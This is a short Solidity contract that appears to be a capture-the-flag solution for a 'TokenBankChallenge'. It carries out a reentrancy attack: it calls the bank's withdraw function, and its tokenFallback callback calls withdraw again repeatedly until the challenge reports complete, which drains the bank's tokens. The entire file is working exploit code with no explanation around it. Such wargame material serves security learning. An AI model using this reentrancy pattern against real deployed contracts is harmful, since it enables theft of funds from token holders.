pragma solidity ^0.4.21;

interface ITokenBankChallenge {
    function isComplete() external view returns (bool);

    function withdraw(uint256 amount) external;
}

contract Solution {
    ITokenBankChallenge bank;

    function solve(ITokenBankChallenge _bank) external {
        bank = _bank;
        bank.withdraw(500000 * 10 ** 18);
    }

    function tokenFallback(address from, uint256 value, bytes) external {
        if (!bank.isComplete()) {
            bank.withdraw(500000 * 10 ** 18);
        }
    }
}
